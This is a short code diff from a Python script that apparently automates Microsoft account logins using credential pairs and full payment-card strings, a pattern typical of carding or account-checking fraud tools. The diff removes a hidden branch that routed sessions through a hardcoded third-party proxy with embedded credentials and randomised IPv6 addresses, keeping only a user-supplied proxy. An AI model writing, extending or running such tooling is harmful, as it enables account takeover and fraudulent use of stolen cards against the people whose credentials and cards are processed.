@@ -73,12 +73,7 @@ def getRandomInt(len : int):
 def main(ms_creds : str , full_card : str):
     s = requests.session()
     if not proxies=="":
-        if proxies=="notlit_is_a_skid":
-            ip = f"2a10:cc46:19{secrets.token_hex(1)}:{secrets.token_hex(2)}:{secrets.token_hex(2)}:{secrets.token_hex(2)}:{secrets.token_hex(2)}:{secrets.token_hex(2)}"
-            ip = ip.replace(":", "%3A")
-            s.proxies={"all": f"http://{ip}:dorgproxy420@ssh.grupahakerskapiotr.us:2139"}
-        else:
-            s.proxies = {"https":str(proxies)}
+        s.proxies = {"https":proxies}
     email = ms_creds.split("|")[0]
     password = ms_creds.split("|")[1]
     card = full_card.split("|")[0]
